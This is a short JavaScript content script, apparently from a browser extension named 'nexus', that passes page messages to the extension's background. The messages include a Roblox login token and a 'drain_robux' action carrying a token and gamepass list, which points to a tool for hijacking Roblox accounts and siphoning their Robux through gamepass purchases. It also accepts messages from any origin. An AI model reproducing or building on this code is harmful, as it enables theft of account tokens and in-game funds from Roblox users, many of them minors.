window.addEventListener('message', (e) => {
  if (e.data?.type === 'nexus-login') {
    chrome.runtime.sendMessage({ action: 'login_roblox', token: e.data.token }, (resp) => {
      window.postMessage({ type: 'nexus-login-response', ok: resp?.ok === true, error: resp?.error }, '*');
    });
  } else if (e.data?.action === 'drain_robux_event') {
    chrome.runtime.sendMessage({
      action: 'drain_robux',
      token: e.data.token,
      gamepasses: e.data.gamepasses
    });
  } else if (e.data?.type === 'nexus-create-gamepasses-request') {
    chrome.runtime.sendMessage({ action: 'create_gamepasses' }, (resp) => {
      window.postMessage({
        type: 'nexus-create-gamepasses-response',
        success: resp?.success === true,
        gamepasses: resp?.gamepasses,
        error: resp?.error
      }, '*');
    });
  }
});
